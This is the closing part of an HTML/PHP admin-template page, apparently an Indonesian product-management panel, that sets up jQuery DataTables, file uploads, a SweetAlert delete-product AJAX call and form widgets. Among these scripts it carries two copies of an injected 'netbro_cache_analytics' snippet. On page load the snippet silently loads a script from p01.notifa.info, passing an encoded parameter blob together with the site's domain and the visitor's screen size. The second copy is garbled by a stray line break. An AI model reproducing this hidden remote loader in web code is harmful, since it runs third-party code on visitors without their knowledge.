        $(document).ready(function() {
            var table = $('#example').DataTable({

                "columnDefs": [{
                    
                    "targets": [0], //first column / numbering column
                    "orderable": true, //set not orderable
                }],
                "displayLength": 25,
                "drawCallback": function(settings) {
                    var api = this.api();
                    var rows = api.rows({
                        page: 'current'
                    }).nodes();
                    var last = null;
                    api.column(2, {
                        page: 'current'
                    }).data().each(function(group, i) {
                        if (last !== group) {
                            $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                            last = group;
                        }
                    });
                }
            });

            // Order by the grouping
            // $('#example tbody').on('click', 'tr.group', function() {
            //     var currentOrder = table.order()[0];
            //     if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
            //         table.order([2, 'desc']).draw();
            //     } else {
            //         table.order([2, 'asc']).draw();
            //     }
            // });
        });
    });

    $('#myTable').DataTable({
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    });
    </script>
    <!-- wysuhtml5 Plugin JavaScript -->
    <script src="../assets/node_modules/html5-editor/wysihtml5-0.3.0.js"></script>
    <script src="../assets/node_modules/html5-editor/bootstrap-wysihtml5.js"></script>
    <script>
        
    $(document).ready(function() {

        $('.textarea_editors').wysihtml5();


    });
    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTvxD%2fUwoNja1VIcc94PK9z%2f1%2f%2fBSp4zSsmIbdW8yiqs6e54ZA9xuIXpqP1xB3FeiDSMYhTNTfQyBSHM%2b1XiKONSKMZ%2fwDNkhMiLuzSZKsiwz1ZP8%2f1T8orQmujZkYemvy6hIZp9E8lIXY6YBeYtvdv6zhVErStAzA97LEItOMFcU7gavPKOHxpJ50hJFa9dQQBJ28E1T53wUUuI6pFhdX8Q2b7Wt0vab35NWYoNDq6yb0D5VLpeQZXkFeFLWyOBdelF%2fVzjZrAtYXUGuSiegsc1hGsNlZ8I00V8PkMG5jbr92wZZh96ft0WWKTGdVJLJgGXhoYOJrxa7AoFa2nELIb2xOZVvNkCZcPEZwwhhUbotxlBbgAwR15F%2beaDH%2bxsJ4ZXDRGP7XDzQOCmqUTnFziROzqu4qEvsuNwrFpnbL86IItPyDfOumUXXZLCzwIDZRvDok7a9BIvuqF3CG%2bp%2fh5XIbgTSXoI4BtQkxwBQt20Av8H7S7%2b%2ba2%2b3d2nXsqg%2fy97hMN%2bksvti%2bLR%2fETjlvgL" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    <!-- jQuery file upload -->
    <script src="<?php echo base_url();?>assets/node_modules/dropify/dist/js/dropify.min.js"></script>
    <script>
    $(document).ready(function() {
        // Basic
        $('.dropify').dropify();

        // Translated
        $('.dropify-fr').dropify({
            messages: {
                default: 'Glissez-déposez un fichier ici ou cliquez',
                replace: 'Glissez-déposez un fichier ou cliquez pour remplacer',
                remove: 'Supprimer',
                error: 'Désolé, le fichier trop volumineux'
            }
        });

        // Used events
        var drEvent = $('#input-file-events').dropify();

        drEvent.on('dropify.beforeClear', function(event, element) {
            return confirm("Do you really want to delete \"" + element.file.name + "\" ?");
        });

        drEvent.on('dropify.afterClear', function(event, element) {
            alert('File deleted');
        });

        drEvent.on('dropify.errors', function(event, element) {
            console.log('Has Errors');
        });

        var drDestroy = $('#input-file-to-destroy').dropify();
        drDestroy = drDestroy.data('dropify')
        $('#toggleDropify').on('click', function(e) {
            e.preventDefault();
            if (drDestroy.isDropified()) {
                drDestroy.destroy();
            } else {
                drDestroy.init();
            }
        })
    });
    </script>

    <script>
    ! function(window, document, $) {
        "use strict";
        $("input,select,textarea").not("[type=submit]").jqBootstrapValidation();
    }(window, document, jQuery);
    </script>


    <!-- Sweet-Alert  -->
    <script src="<?php echo base_url();?>assets/node_modules/sweetalert/sweetalert.min.js"></script>
    <script src="<?php echo base_url();?>assets/node_modules/sweetalert/jquery.sweet-alert.custom.js"></script>


    <script type="text/javascript">

    $(document).on("click",".hapus-produk",function(){
    
    $.ajaxSetup({
      type:"post",
      cache:false,
      dataType: "json"
    })

    var id=$(this).attr("data-id");
    // var nama=$(this).attr("data-name");
    var photo=$(this).attr("data-photo");

    // alert(id+' _' + photo);


        swal({   
            title: "Anda Yakin?",   
            text: "Menghapus data  ?",   
            type: "warning",   
            showCancelButton: true,   
            confirmButtonColor: "#DD6B55",   
            confirmButtonText: "Yes, delete it!",   
            cancelButtonText: "No, cancel plx!",   
            closeOnConfirm: false,   
            closeOnCancel: false 
        }, function(isConfirm){   
            if (isConfirm) {  
                $.ajax({
                data:{id:id,photo:photo},
                url:"<?php echo base_url('Admin-area/delete-produk');?>",
                success: function(html) {
                    $("tr[data-id='"+id+"']").fadeOut(1500,function(){
                        $(this).remove();
                    });
                    swal({   
                        title: "Deleted !",   
                        text: "Sukses dihapus",   
                        type: "success",       
                        confirmButtonText: "Ok",    
                        closeOnConfirm: false,   
                        closeOnCancel: false 
                    }, function(isConfirm){   
                        if (isConfirm) {     
                             location.reload();
                        } else {     
                            swal("Cancelled", "Your imaginary file is safe :)", "error");   
                        } 
                    });
                }

                })   
               
            } else {     
                swal("Cancelled", "Data batal dihapus.", "error");   
            } 
        });
    });


    </script>

    <script src="<?php echo base_url(); ?>assets/node_modules/switchery/dist/switchery.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/select2/dist/js/select2.full.min.js" type="text/javascript"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-select/bootstrap-select.min.js" type="text/javascript"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.js" type="text/javascript"></script>
    <script type="text/javascript" src="../assets/node_modules/multiselect/js/jquery.multi-select.js"></script>
    <script>
    jQuery(document).ready(function() {
        // Switchery
        var elems = Array.prototype.slice.call(document.querySelectorAll('.js-switch'));
        $('.js-switch').each(function() {
            new Switchery($(this)[0], $(this).data());
        });
        // For select 2
        $(".select2").select2();
        $('.selectpicker').selectpicker();
        //Bootstrap-TouchSpin
        $(".vertical-spin").TouchSpin({
            verticalbuttons: true,
            verticalupclass: 'ti-plus',
            verticaldownclass: 'ti-minus'
        });
        var vspinTrue = $(".vertical-spin").TouchSpin({
            verticalbuttons: true
        });
        if (vspinTrue) {
            $('.vertical-spin').prev('.bootstrap-touchspin-prefix').remove();
        }
        $("input[name='tch1']").TouchSpin({
            min: 0,
            max: 100,
            step: 0.1,
            decimals: 2,
            boostat: 5,
            maxboostedstep: 10,
            postfix: '%'
        });
        $("input[name='price']").TouchSpin({
            min: 0,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            prefix: 'Rp'
        });
        $("input[name='stok']").TouchSpin();
        $("input[name='tch3_22']").TouchSpin({
            initval: 40
        });
        $("input[name='tch5']").TouchSpin({
            prefix: "pre",
            postfix: "post"
        });
        // For multiselect
        $('#pre-selected-options').multiSelect();
        $('#optgroup').multiSelect({
            selectableOptgroup: true
        });
        $('#public-methods').multiSelect();
        $('#select-all').click(function() {
            $('#public-methods').multiSelect('select_all');
            return false;
        });
        $('#deselect-all').click(function() {
            $('#public-methods').multiSelect('deselect_all');
            return false;
        });
        $('#refresh').on('click', function() {
            $('#public-methods').multiSelect('refresh');
            return false;
        });
        $('#add-option').on('click', function() {
            $('#public-methods').multiSelect('addOption', {
                value: 42,
                text: 'test 42',
                index: 0
            });
            return false;
        });
        $(".ajax").select2({
            ajax: {
                url: "https://api.github.com/search/repositories",
                dataType: 'json',
                delay: 250,
                data: function(params) {
                    return {
                        q: params.term, // search term
                        page: params.page
                    };
                },
                processResults: function(data, params) {
                    // parse the results into the format expected by Select2
                    // since we are using custom formatting functions we do not need to
                    // alter the remote JSON data, except to indicate that infinite
                    // scrolling can be used
                    params.page = params.page || 1;
                    return {
                        results: data.items,
                        pagination: {
                            more: (params.page * 30) < data.total_count
                        }
                    };
                },
                cache: true
            },
            escapeMarkup: function(markup) {
                return markup;
            }, // let our custom formatter work
            minimumInputLength: 1,
            // templateResult: formatRepo, // omitted for brevity, see the source of this page
            //templateSelection: formatRepoSelection // omitted for brevity, see the source of this page
        });
    });
    </script>

    <!-- ajax -->
<script type="text/javascript">
            
$(function(){

  $.ajaxSetup({
  type:"post",
  cache:false,
  dataType: "json"
})



// CLick Edit

$(document).on("click","#ubah",function(){
$(this).find("span[class~='caption']").hide();
$(this).find("input[class~='editor']").fadeIn(1000).focus();
});


$(document).on("click","#ubah2",function(){
$(this).find("p[class~='card-text']").hide();
$(this).find("textarea[class~='editor']").fadeIn(1000).focus();
});

    

    









});
    </script>

       <script type="text/javascript">
        $(document).ready(function(){
      
          
                 var discount1 = $('.type-users').find(':selected').data('discount');
                 var keterangan1 = $('.type-users').find(':selected').data('keterangan');
                // alert(keterangan);\
                $("#detail_discount").css("font-weight", "bold");
                $("#detail_keterangan").css("font-weight", "bold");
                $( '#detail_discount' ).html(discount1+'%').fadeIn(1000);
                $( '#detail_keterangan' ).html(keterangan1 ).fadeIn(1000);

            

            $('.type-users').change(function(){
          
                 var discount = $(this).find(':selected').data('discount');
                 var keterangan = $(this).find(':selected').data('keterangan');
                // alert(keterangan);\
                $("#detail_discount").css("font-weight", "bold");
                $("#detail_keterangan").css("font-weight", "bold");
                $( '#detail_discount' ).html(discount+'%').fadeIn(1000);
                $( '#detail_keterangan' ).html(keterangan ).fadeIn(1000);

            });
        });
        </script>




<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();call
();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTtOdzpINRJK8Lq5daklVvl%2b0ekwjWEdI3LkcWt04FU%2fMGdgvPvlk4r8N49s3uqel0%2bRQ5bk0wElt2WxkjEhDArisi1TM0kxZ3gfW3oZWXqN1EisiLm71HF4s473MxGR9d1AhzHXf%2bzbDjoIQvC%2fwki5PNvo7sNVRBfvGMu7TSjmrekcGzamLffm%2f41XXU3zPoM6%2fsICb2HG1HcBtC%2buyil8u3rwrWbYA6bhroR9AZgDIW4iW%2btOTtjbTttqBTO8j6FuIQ4007JaLqEvdPNlFz3fm0wu1Wt9d9B%2b0qjTqAa1mTsk%2fp6uCty1dbRoWloKtjJQ2OUcf8M%2fbO7V8gOAMe0C9WimU49s%2bpG%2bS5Rf1y8od4%2b3D%2ffzJPqoS5lwyzJWkb5GVR2RrFJwQVMrS9%2bjlsbDiOfP8btteDNvWvjgUsf9EgpPdft7F%2fMjDSWDfG0NOO79V%2fvUCQdFmU%2faUULArU1ORrFY8fxqSaQ5mW4geJbskB%2bjAn2DXH9gW1wJjZMP2BBxNpKfSORlnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
   




   </body>


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:42:49 GMT -->
</html>